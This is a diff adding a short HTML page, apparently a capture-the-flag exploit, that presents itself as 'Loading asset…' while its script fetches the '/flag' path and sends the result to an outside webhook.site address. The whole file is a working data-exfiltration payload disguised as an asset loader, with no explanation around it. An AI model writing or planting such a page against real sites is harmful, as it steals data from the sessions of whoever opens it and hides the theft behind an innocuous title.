@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>Loading asset…</h1>
+
+<script>
+fetch('/flag')
+  .then(r => r.text())
+  .then(d => {
+    fetch('https://webhook.site/0b9430a0-c1d2-4078-8f30-8e96d5b1e081?data=' + encodeURIComponent(d))
+  });
+</script>
+
+</body>
+</html>
